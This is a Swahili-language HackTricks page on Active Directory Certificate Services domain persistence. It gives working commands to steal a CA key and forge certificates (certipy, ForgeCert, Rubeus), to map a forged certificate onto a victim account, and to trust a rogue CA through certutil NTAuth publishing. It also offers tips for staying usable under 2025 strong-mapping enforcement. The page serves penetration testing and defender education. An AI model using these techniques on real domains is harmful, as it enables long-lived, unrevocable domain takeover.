# AD CS Domain Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Hii ni muhtasari wa mbinu za domain persistence zilizoshirikiwa katika [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf). Angalia kwa maelezo zaidi.**

## Forging Certificates with Stolen CA Certificates (Golden Certificate) - DPERSIST1

Unawezaje kujua kwamba cheti ni cheti cha CA?

Inaweza kubainika kwamba cheti ni cheti cha CA ikiwa masharti kadhaa yanatimizwa:

- Cheti kimehifadhiwa kwenye CA server, na ufunguo wake wa kibinafsi umehifadhiwa kwa DPAPI ya mashine, au kwa vifaa kama TPM/HSM ikiwa mfumo wa uendeshaji unaunga mkono hilo.
- Sehemu za Issuer na Subject za cheti zinalingana na distinguished name ya CA.
- Upanuzi wa "CA Version" upo pekee kwenye vyeti vya CA.
- Cheti hakina sehemu za Extended Key Usage (EKU).

Ili kutoa ufunguo wa kibinafsi wa cheti hiki, zana `certsrv.msc` kwenye CA server ndiyo njia inayoungwa mkono kupitia GUI iliyojengwa. Hata hivyo, cheti hiki hakitofauti na vyengine vilivyohifadhiwa ndani ya mfumo; kwa hivyo, mbinu kama [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) zinaweza kutumika kwa uchimbaji.

Cheti na ufunguo wa kibinafsi pia yanaweza kupatikana kwa kutumia Certipy na amri ifuatayo:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Baada ya kupata cheti cha CA na private key yake katika muundo `.pfx`, zana kama [ForgeCert](https://github.com/GhostPack/ForgeCert) zinaweza kutumika kutengeneza vyeti halali:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> Mtumiaji anayelengwa kwa certificate forgery lazima awe hai na awe na uwezo wa kuthibitisha utambulisho katika Active Directory ili mchakato ufanikiwe. Kuforija certificate kwa akaunti maalum kama krbtgt haina ufanisi.

Certificate hii iliyeforishwa itakuwa **halali** hadi tarehe ya mwisho iliyobainishwa na kwa **muda ambao root CA certificate itakavyokuwa halali** (kwa kawaida kutoka miaka 5 hadi **10+ years**). Pia ni halali kwa **machines**, hivyo ikichanganywa na **S4U2Self**, mshambuliaji anaweza **maintain persistence on any domain machine** kwa muda ambao CA certificate itakuwa halali.\
Zaidi ya hayo, **certificates generated** kwa njia hii **haiwezi kufutwa** kwani CA haijui kuhusu hizo.

### Kufanya kazi chini ya Strong Certificate Mapping Enforcement (2025+)

Tangu February 11, 2025 (baada ya rollout ya KB5014754), domain controllers kwa chaguo-msingi zina **Full Enforcement** kwa certificate mappings. Kivitendo hii inamaanisha certificates zako zilizoforishwa lazima zifanye mojawapo ya yafuatayo:

- Ziwe na uhusiano imara na akaunti lengwa (kwa mfano, SID security extension), au
- Zikusanywe pamoja na mapping imara, wazi kwenye sifa ya kitu lengwa `altSecurityIdentities`.

Njia ya kuaminika kwa persistence ni kutengeneza certificate iliyeforishwa iliyochained kwa Enterprise CA iliyoporwa na kisha kuongeza mapping imara, wazi kwa principal wa mwathirika:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Vidokezo
- Ikiwa unaweza kutengeneza vyeti vilivyo bandia vinavyojumuisha SID security extension, vitahusishwa kwa moja hata chini ya Full Enforcement. La sivyo, pendelea mappings wazi zenye nguvu. Tazama
[account-persistence](account-persistence.md) kwa maelezo zaidi juu ya mappings wazi.
- Ufutaji wa vyeti hauwasaidii walinzi hapa: vyeti vilivyobanwa havijulikani kwa hifadhidata ya CA na kwa hivyo haviwezi kufutwa.

## Kuamini Vyeti vya Rogue CA - DPERSIST2

Kituo cha `NTAuthCertificates` kimefafanuliwa kuwa kina moja au zaidi za **CA certificates** ndani ya sifa yake ya `cacertificate`, ambazo Active Directory (AD) hutumia. Mchakato wa uhakiki unaofanywa na **domain controller** unahusisha kukagua kitu cha `NTAuthCertificates` kutafuta kipengee kinacholingana na **CA specified** iliyotajwa katika uwanja wa Issuer wa **certificate** inayothibitisha. Uthibitisho unaendelea ikiwa mlingano unapopatikana.

Vyeti vya CA vilivyosainiwa wenyewe vinaweza kuongezwa kwenye kitu cha `NTAuthCertificates` na mshambulizi, mradi wana udhibiti wa kitu hiki cha AD. Kwa kawaida, ni wanachama wa kundi la **Enterprise Admin**, pamoja na **Domain Admins** au **Administrators** katika **forest root’s domain**, ambao wanapewa ruhusa ya kubadilisha kitu hiki. Wanaweza kuhariri kitu cha `NTAuthCertificates` kwa kutumia `certutil.exe` na amri `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, au kwa kutumia [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Amri za ziada zinazosaidia kwa mbinu hii:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Uwezo huu ni muhimu hasa unapotumiwa pamoja na mbinu iliyotajwa hapo awali inayotumia ForgeCert kuunda vyeti kwa njia ya dinamik.

> Post-2025 mapping considerations: placing a rogue CA in NTAuth only establishes trust in the issuing CA. To use leaf certificates for logon when DCs are in **Full Enforcement**, the leaf must either contain the SID security extension or there must be a strong explicit mapping on the target object (for example, Issuer+Serial in `altSecurityIdentities`). See {{#ref}}account-persistence.md{{#endref}}.

## Utekelezwaji Mbaya wa Mipangilio - DPERSIST3

Fursa za **udumu** kupitia **mabadiliko ya security descriptor ya vipengele vya AD CS** ni nyingi. Mabadiliko yaliyoelezewa katika sehemu ya "[Domain Escalation](domain-escalation.md)" yanaweza kutekelezwa kwa madhumuni mabaya na mshambuliaji mwenye ruhusa zilizoongezeka. Hii inajumuisha kuongeza "control rights" (mfano, WriteOwner/WriteDACL/n.k.) kwa vipengele nyeti kama:

- Kitu cha **kompyuta ya AD ya server ya CA**
- **RPC/DCOM server** ya server ya CA
- Kila **kitu au kontena kilicho chini cha AD** ndani ya **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (kwa mfano, Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, n.k.)
- **Vikundi vya AD vilivyopewa haki za kudhibiti AD CS** kwa default au na shirika (kama vile kikundi kilichojengwa Cert Publishers na wanachama wake)

Mfano wa utekelezaji mbaya ungemhusisha mshambuliaji, ambaye ana **ruhusa zilizoongezeka** katika domain, kuongeza ruhusa ya **`WriteOwner`** kwenye template ya cheti ya default **`User`**, akiwa mshambuliaji ndiye mhusika wa haki hiyo. Ili kuifanyia udanganyifu hii kazi, mshambuliaji atabadilisha kwanza umiliki wa template ya **`User`** kuwa wao. Baadaye, **`mspki-certificate-name-flag`** itawekwa kuwa **1** kwenye template ili kuwezesha **`ENROLLEE_SUPPLIES_SUBJECT`**, ikiruhusu mtumiaji kutoa Subject Alternative Name katika ombi. Baadaye, mshambuliaji anaweza **enroll** akitumia **template**, akiweka jina la **domain administrator** kama jina mbadala, na kutumia cheti alichopata kwa uthibitisho kama DA.

Vigezo vitakavyowekwa na washambuliaji kwa ajili ya udumu wa muda mrefu wa domain (angalia {{#ref}}domain-escalation.md{{#endref}} kwa maelezo kamili na utambuzi):

- Bendera za sera za CA zinazoruhusu SAN kutoka kwa waombaji (mfano, kuwezesha `EDITF_ATTRIBUTESUBJECTALTNAME2`). Hii inafanya njia zinazofanana na ESC1 zibaki zikifunguka kwa matumizi.
- DACL ya template au mipangilio inayoruhusu utoaji unaoweza kutumika kwa authentication (mfano, kuongeza Client Authentication EKU, kuwezesha `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Kudhibiti kitu `NTAuthCertificates` au kontena za CA ili kuendelea kuingiza tena waoutaji rogue ikiwa walinzi watajaribu kusafisha.

> [!TIP]
> Katika mazingira yaliyohifadhiwa ngumu baada ya KB5014754, kuoanisha mipangilio mibaya hii na ramani wazi na thabiti (`altSecurityIdentities`) kunahakikisha vyeti ulivyotoa au kuunda vinabaki vinavyoweza kutumika hata wakati DCs zinatekeleza ramani imara.

## Marejeo

- Microsoft KB5014754 – Mabadiliko ya certificate-based authentication kwenye Windows domain controllers (muda wa utekelezaji na ramani imara). https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy – Command Reference and forge/auth usage. https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
